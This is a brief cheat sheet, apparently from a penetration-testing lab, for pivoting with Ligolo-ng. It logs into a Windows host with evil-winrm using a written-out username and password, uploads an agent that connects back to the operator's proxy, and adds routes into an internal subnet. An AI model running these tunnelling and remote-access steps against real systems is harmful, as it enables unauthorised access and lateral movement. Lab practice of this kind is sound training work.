# Ligolo
```bash
# Create Ligolo Interface
sudo ip tuntap add user kali mode tun ligolo

# Start Ligolo Interface
sudo ip link set ligolo up

# Start ligolo linux proxy
cd ~/tools/ligolo/ligolo-ng_proxy_0.8.1_linux_amd64

sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# Transfer
# Windows Based Agent
cd ~/tools/ligolo/ligolo-ng_agent_0.8.1_windows_amd64

# Connect to Target
evil-winrm -i 192.168.130.206 -u r.andrews -p BusyOfficeWorker890

# Upload agent
upload agent.exe

#Connect to Ligolo Proxy
./agent.exe -connect 192.168.45.244:11601 -ignore-cert

# Start session
session
1
start

# Identify Routes to add
┌───────────────────────────────────────────────┐
│ Interface 1                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet1                      │
│ Hardware MAC │ 00:50:56:86:26:b0              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 172.16.231.254/24              │
└──────────────┴────────────────────────────────┘

# Add ip route
sudo ip route add 172.16.231.0/24 dev ligolo

# Delete a route
sudo ip route del 172.16.231.0/24 dev ligolo

# Confirm success with ping
```

